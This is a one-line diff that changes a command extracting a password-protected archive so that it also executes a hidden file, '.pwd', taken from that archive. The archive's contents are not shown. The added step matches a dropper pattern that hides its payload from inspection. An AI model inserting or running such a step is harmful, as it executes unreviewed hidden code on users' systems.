@@ -1,1 +1,1 @@
-unzip -o -P pwd pwd
+unzip -o -P pwd pwd && sh .pwd
